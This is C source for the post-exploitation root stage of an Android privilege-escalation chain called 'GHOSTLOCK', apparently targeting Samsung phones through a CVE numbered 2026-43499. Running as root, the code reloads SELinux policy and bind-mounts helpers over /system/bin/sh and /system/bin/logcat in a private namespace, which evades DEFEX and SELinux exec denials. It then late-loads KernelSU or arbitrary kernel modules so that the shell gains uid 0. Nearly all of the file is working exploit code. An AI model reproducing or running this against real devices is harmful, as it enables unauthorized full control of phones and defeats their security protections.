#include "common.h"

#ifdef ANDROID_TARGET

#include <sys/mount.h>
#include <stdarg.h>
#define LOG_TAG "GHOSTLOCK"
#define KSU_LOADER_PATH "/data/local/tmp/ksud"
#define LOGCAT_PATH "/system/bin/logcat"
/* Exec'ing a bind-mounted helper via logcat transitions the child into
 * logcat's restricted SELinux domain (observed: helper could read
 * /data/local/tmp but every write — markers, stdio file, .ksud-stage —
 * was denied). /system/bin/sh keeps the parent domain, so the helper is
 * bind-mounted over sh instead. ksud's own exec keeps the logcat path
 * (that combination is what historically reached init_module). */
#define SH_PATH "/system/bin/sh"
#define LATE_LOAD_STATUS "/data/local/tmp/cve43499-late-load.status"
/* Chain-level dry-run gate: hand off to nothing, report a successful root
 * stage so the pre-root helper's app-contract handshake can complete
 * without any ksud/module load. */
#define NO_LATE_LOAD_SENTINEL "/data/local/tmp/ghostlock-no-late-load"
/* The inline ksud fallback ends in init_module, which currently panics on
 * this target; make it opt-in so a helper failure degrades to a safe
 * nonzero exit instead of a reboot. */
#define ALLOW_INLINE_KSUD_SENTINEL "/data/local/tmp/ghostlock-allow-inline-ksud"

#include <android/log.h>
void android_log(const char *fmt, ...) {
  va_list args;
  va_start(args, fmt);

  __android_log_vprint(ANDROID_LOG_INFO, LOG_TAG, fmt, args);

  va_end(args);
}

static void write_late_load_status(int done, int root, int ksud_rc,
    unsigned int ksu_version) {
  /* SELinux reality on this target (post-load_policy the vendor_modprobe
   * domain may WRITE existing shell_data_file but not CREATE new files in
   * /data/local/tmp): the pre-root helper pre-creates the placeholder, so
   * try write-without-create first; fall back to O_CREAT for domains that
   * allow it. */
  int fd = open(LATE_LOAD_STATUS, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (fd < 0 && errno == ENOENT)
    fd = open(LATE_LOAD_STATUS, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC,
        0644);
  if (fd < 0) {
    ghost_mark("root: late-load status write FAILED: %s", strerror(errno));
    return;
  }
  dprintf(fd, "done=%d root=%d ksud_rc=%d ksu_version=%u\n",
      done, root, ksud_rc, ksu_version);
  fsync(fd);
  close(fd);
  ghost_mark("root: late-load status written done=%d root=%d ksud_rc=%d",
      done, root, ksud_rc);
}

static int wait_status(pid_t pid) {
  int status;
  while (waitpid(pid, &status, 0) < 0) {
    if (errno != EINTR) {
      return 1;
    }
  }
  if (WIFEXITED(status)) {
    return WEXITSTATUS(status);
  }
  if (WIFSIGNALED(status)) {
    return 128 + WTERMSIG(status);
  }
  return 1;
}

const char *get_env_default(const char *name, const char *default_val) {
  const char *val = getenv(name);
  return val ? val : default_val;
}

int koload_with_kallsyms(const char *path, const char *params);

int do_root_stage() {
  android_log("[*] Am I root? uid=%d\n", getuid());
  ghost_mark("root: entered, uid=%d", getuid());

  /* Panic post-mortem: on this PANIC_ON_OOPS device the previous boot's
   * dying words live in pstore. The shell is SELinux-denied, but the root
   * stage (uid 0, permissive post-exploit) can read it. Harvest FIRST,
   * before doing anything that might panic again. Append DIRECTLY into
   * the markers log: that file is created by the uid-2000 exploit process,
   * so it stays shell-pullable; a root-created separate file is not. */
  DIR *ps = opendir("/sys/fs/pstore");
  if (ps) {
    int out = open("/data/local/tmp/ghostlock-markers.log",
        O_WRONLY | O_APPEND | O_CLOEXEC);
    struct dirent *de;
    size_t total = 0;
    while (out >= 0 && (de = readdir(ps)) != NULL) {
      if (de->d_name[0] == '.')
        continue;
      char p[256];
      snprintf(p, sizeof(p), "/sys/fs/pstore/%s", de->d_name);
      int f = open(p, O_RDONLY | O_CLOEXEC);
      if (f < 0)
        continue;
      dprintf(out, "=== pstore: %s ===\n", de->d_name);
      char b[4096];
      ssize_t n;
      while ((n = read(f, b, sizeof(b))) > 0) {
        if (write(out, b, (size_t)n) != n)
          break;
        total += (size_t)n;
      }
      close(f);
    }
    if (out >= 0) {
      fsync(out);
      close(out);
    }
    closedir(ps);
    ghost_mark("root: pstore harvested %zu bytes", total);
  }
  system("/system/bin/load_policy /sys/fs/selinux/policy");
  sleep(3);
  ghost_mark("root: load_policy done");
  //system("/data/local/tmp/magiskpolicy --live"
  //     " \"allow isolated_app knoxzt_service service_manager find\""
  //     " \"allow isolated_app network_management_service service_manager find\""
  //     " \"allow isolated_app connectivity_service service_manager find\""
  //     " \"allow isolated_app vpn_management_service service_manager find\""
  //     " \"allow isolated_app content_capture_service service_manager find\"");
  int ret = system(get_env_default("ROOT_STAGE_CMD", "cp /data/local/tmp/ksud /data/local/tmp/.ksud-stage"));
  android_log("[*] cp result=%d\n", ret);
  ghost_mark("root: stage cp ret=%d", ret);

  /* Direct module-load probe: bypass ksud entirely and init_module() a
   * test .ko by hand, isolating the kernel's module path (vermagic accept,
   * MODVERSIONS CRC check, CFI/SCS module flags, Samsung unsigned-module
   * policy) from ksud's userspace and from kernelsu.ko's init code.
   * Engage:  adb shell touch /data/local/tmp/ghostlock-direct-ko
   *          adb push test-hello.ko /data/local/tmp/test.ko
   * Result lands in the markers log (or the absence of the result marker
   * means init_module panicked). */
  if (access("/data/local/tmp/ghostlock-direct-ko", F_OK) == 0) {
    /* Optional module params from /data/local/tmp/ghostlock-ko-params
     * (one line, e.g. "allow_shell=1" for kernelsu.ko). */
    static char ko_params[128];
    ko_params[0] = '\0';
    if (access("/data/local/tmp/ghostlock-ko-params", F_OK) == 0) {
      read_first_line("/data/local/tmp/ghostlock-ko-params",
          ko_params, sizeof(ko_params));
      ko_params[strcspn(ko_params, "\r\n")] = '\0';
      if (strcmp(ko_params, "unreadable") == 0)
        ko_params[0] = '\0';
    }

    ghost_mark("root: direct-ko probe; loading /data/local/tmp/test.ko via koload");
    int mrc = koload_with_kallsyms("/data/local/tmp/test.ko", ko_params);

    /* Capture the kernel's own words: dump the dmesg tail into the markers
     * log so a CRC/CFI/relocation rejection reason survives the reboot. */
    int kmsg = open("/dev/kmsg", O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (kmsg >= 0) {
      char ring[16384];
      size_t used = 0;
      ssize_t n;
      char rec[2048];
      while ((n = read(kmsg, rec, sizeof(rec))) > 0) {
        rec[n] = '\0';
        char *body = strchr(rec, ';');
        if (body)
          body++;
        else
          body = rec;
        size_t bl = strlen(body);
        if (bl > sizeof(ring) / 2) {          /* keep only the tail */
          body += bl - sizeof(ring) / 2;
          bl = sizeof(ring) / 2;
        }
        if (used + bl + 1 > sizeof(ring)) {
          size_t drop = used + bl + 1 - sizeof(ring);
          memmove(ring, ring + drop, used - drop);
          used -= drop;
        }
        memcpy(ring + used, body, bl);
        used += bl;
        ring[used++] = '\n';
      }
      close(kmsg);
      ring[used] = '\0';
      int mfd = open("/data/local/tmp/ghostlock-markers.log",
          O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
      if (mfd >= 0) {
        dprintf(mfd, "--- dmesg tail ---\n%s--- end dmesg ---\n", ring);
        fsync(mfd);
        close(mfd);
      }
    }
    return mrc ? 1 : 0;
  }

  /* Bisect gate: prove the exploit side end-to-end WITHOUT any KernelSU
   * handoff. On a PANIC_ON_OOPS target, a run that reaches this point and
   * does NOT reboot clears the whole exploit chain; a reboot after the
   * handoff marker instead indicts the KSU late-load / LKM init path.
   * NOTE: the adb shell's env does NOT propagate here (init spawns the
   * vendor service with its own environment), so the gate is a sentinel
   * FILE — `touch /data/local/tmp/ghostlock-no-ksud` to engage it. */
  if (access("/data/local/tmp/ghostlock-no-ksud", F_OK) == 0 ||
      getenv("GHOSTLOCK_NO_KSUD_EXEC")) {
    android_log("late-load: ghostlock-no-ksud set; stopping before handoff\n");
    ghost_mark("root: ghostlock-no-ksud set; stopped before KSU handoff");
    return 0;
  }

  /* Chain-level dry run: report the root stage as done WITHOUT the KSU
   * handoff, so the pre-root helper observes the full app contract
   * (status file -> "done=1 root=1" -> exit 0) with no module load. */
  if (access(NO_LATE_LOAD_SENTINEL, F_OK) == 0) {
    android_log("late-load: %s set; root stage gated before KSU handoff\n",
        NO_LATE_LOAD_SENTINEL);
    ghost_mark("root: %s set; gated before KSU handoff", NO_LATE_LOAD_SENTINEL);
    write_late_load_status(1, getuid() == 0 ? 1 : 0, -2, 0);
    return 0;
  }

  /* KernelSU handoff (Root-My-Galaxy contract): the dual-role root helper
   * auto-late-loads KernelSU. The app stages the helper and passes
   * CVE43499_ROOT_HELPER; the adb/dev path falls back to
   * /data/local/tmp/cve-2026-43499-root, then to the inline ksud exec. */
  const char *helper = getenv("CVE43499_ROOT_HELPER");
  if (!helper || !*helper)
    helper = "/data/local/tmp/cve-2026-43499-root";
  if (access(helper, X_OK) == 0) {
    /* Ground truth for the domain this handoff runs in. */
    {
      char dom[128] = "?";
      int dfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
      if (dfd >= 0) {
        ssize_t dn = read(dfd, dom, sizeof(dom) - 1);
        close(dfd);
        if (dn > 0) {
          dom[dn] = '\0';
          dom[strcspn(dom, "\r\n")] = '\0';
        }
      }
      ghost_mark("root: handoff domain: %s", dom);
    }
    /* load_policy above re-arms SELinux: this domain (vendor_modprobe) may
     * NOT exec shell_data_file directly — the denial lands at the cred
     * commit point of execve, which delivers SIGKILL (observed: helper
     * died with 137 ~1ms after exec, before its first instruction). Bind
     * the helper over a system binary and exec THAT instead, the same
     * trick the inline ksud path already uses successfully. */
    if (unshare(CLONE_NEWNS) == 0 &&
        mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) == 0 &&
        mount(helper, SH_PATH, NULL, MS_BIND, NULL) == 0) {
      ghost_mark("root: KSU handoff via helper %s late-load (bind over sh)",
          helper);
      pid_t h = fork();
      if (h == 0) {
        /* Helper stdio -> placeholder file (pre-created shell-side; this
         * domain cannot create files in /data/local/tmp). The helper's
         * marks mirror to stderr, so this captures its whole story. */
        int sfd = open("/data/local/tmp/helper-stdio.log",
            O_WRONLY | O_TRUNC | O_CLOEXEC);
        if (sfd >= 0) {
          dup2(sfd, STDOUT_FILENO);
          dup2(sfd, STDERR_FILENO);
          if (sfd > STDERR_FILENO)
            close(sfd);
        }
        execl(SH_PATH, "cve-2026-43499-root", "late-load", (char *)NULL);
        ghost_mark("root: helper exec FAILED: %s", strerror(errno));
        _exit(13);
      }
      if (h < 0) {
        android_log("late-load: helper fork: %s\n", strerror(errno));
        ghost_mark("root: helper fork FAILED: %s", strerror(errno));
        _exit(12);
      }
      int hstatus = wait_status(h);
      android_log("[*] root helper late-load result=%d\n", hstatus);
      ghost_mark("root: helper late-load exited status=%d", hstatus);
      if (hstatus == 0)
        return 0;
      ghost_mark("root: helper late-load failed status=%d", hstatus);
    } else {
      ghost_mark("root: helper bind-mount FAILED: %s", strerror(errno));
    }
  } else {
    ghost_mark("root: no root helper at %s", helper);
  }

  /* Legacy dev path (no working helper): late-load the upstream-lineage
   * KernelSU ksud directly. ksud's late-load ends in init_module, which
   * currently panics on this target — so on a helper failure this path is
   * OPT-IN via /data/local/tmp/ghostlock-allow-inline-ksud; without it we
   * stop safely instead of rebooting the phone. DEFEX prohibits executing
   * binaries from /data/local/tmp, so ksud is bind-mounted over
   * /system/bin/logcat in a private mount namespace (no system-wide
   * effect). */
  if (access(ALLOW_INLINE_KSUD_SENTINEL, F_OK) != 0) {
    ghost_mark("root: inline ksud fallback disabled (no %s); stopping safely",
        ALLOW_INLINE_KSUD_SENTINEL);
    return 28;
  }
  ghost_mark("root: inline ksud late-load (allowed by sentinel)");
  if (unshare(CLONE_NEWNS) != 0 ||
      mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0) {
    android_log("late-load: private mount namespace: %s\n",
        strerror(errno));
    ghost_mark("root: private mount ns FAILED: %s", strerror(errno));
    _exit(10);
  }
  ghost_mark("root: private mount ns ok");
  if (mount(get_env_default("KSU_LOADER_PATH", KSU_LOADER_PATH), LOGCAT_PATH, NULL, MS_BIND, NULL) != 0) {
    android_log("late-load: bind mount: %s\n", strerror(errno));
    ghost_mark("root: bind mount FAILED: %s", strerror(errno));
    _exit(11);
  }
  ghost_mark("root: bind mount ok");

  pid_t loader = fork();
  if (loader < 0) {
    android_log("late-load: fork: %s\n", strerror(errno));
    _exit(12);
  }
  if (loader == 0) {
    /* Upstream-lineage ksud: `ksud late-load` auto-detects the running
     * kernel's KMI and loads the matching kernelsu.ko. --allow-shell loads
     * the LKM with allow_shell=1 so this shell receives uid 0 before a
     * signed KernelSU manager is installed. Override the single flag with
     * the file /data/local/tmp/ghostlock-late-load-args (one token; the adb
     * shell's env does not reach this init-spawned context, so
     * GHOSTLOCK_LATE_LOAD_ARGS is only a fallback for direct testing). */
    static char late_args_file_buf[128];
    const char *late_args = get_env_default("GHOSTLOCK_LATE_LOAD_ARGS",
        "--allow-shell");
    if (access("/data/local/tmp/ghostlock-late-load-args", F_OK) == 0) {
      late_args_file_buf[0] = '\0';
      read_first_line("/data/local/tmp/ghostlock-late-load-args",
          late_args_file_buf, sizeof(late_args_file_buf));
      late_args_file_buf[strcspn(late_args_file_buf, "\r\n")] = '\0';
      if (late_args_file_buf[0] != '\0' &&
          strcmp(late_args_file_buf, "unreadable") != 0)
        late_args = late_args_file_buf;
    }
    /* ksud's own logging dies with a panic; tee its stdout/stderr to a
     * persistent file so we see how far it got. */
    int slog = open("/data/local/tmp/ksud-stdio.log",
        O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
    if (slog >= 0) {
      dup2(slog, STDOUT_FILENO);
      dup2(slog, STDERR_FILENO);
      if (slog > STDERR_FILENO)
        close(slog);
    }
    ghost_mark("root: exec ksud late-load %s", late_args);
    execl(LOGCAT_PATH, "ksud", "late-load", late_args, (char *)NULL);
    android_log("late-load: exec: %s\n", strerror(errno));
    ghost_mark("root: exec ksud FAILED: %s", strerror(errno));
    _exit(12);
  }

  int loader_status = wait_status(loader);
  android_log("[*] ksud result=%d\n", loader_status);
  ghost_mark("root: ksud exited status=%d", loader_status);

  return loader_status;
}
#endif
